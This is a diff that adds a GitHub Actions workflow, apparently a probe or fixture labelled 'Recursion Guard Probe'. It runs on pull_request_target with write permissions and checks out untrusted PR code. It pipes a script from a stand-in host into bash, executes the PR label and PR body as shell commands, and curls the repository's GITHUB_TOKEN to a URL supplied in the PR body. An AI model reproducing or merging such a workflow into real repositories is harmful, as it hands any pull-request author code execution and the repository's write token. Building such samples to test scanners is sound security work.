@@ -1,0 +1,21 @@
+name: DCOIR Review v13 Recursion Guard Probe
+on:
+  pull_request_target:
+permissions:
+  contents: write
+  actions: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - name: Network installer
+        run: wget -qO- https://downloads.example.invalid/agent/install.sh | bash
+      - name: PR label shell
+        run: bash -lc "${{ github.event.pull_request.labels[0].name }}"
+      - name: Token to PR URL
+        run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"
+      - name: PR body shell
+        run: sh -c "${{ github.event.pull_request.body }}"
